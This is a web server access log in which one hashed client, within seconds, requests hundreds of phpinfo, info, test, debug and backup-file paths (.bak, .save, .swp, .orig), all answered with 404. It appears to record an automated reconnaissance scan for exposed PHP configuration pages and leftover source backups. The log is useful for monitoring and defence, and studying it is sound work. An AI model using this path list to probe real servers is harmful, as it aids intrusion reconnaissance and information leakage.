043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:10;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:11;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:13;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:14;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:15;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:16;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:17;;/admin/phpinfo.php.save;GET;404
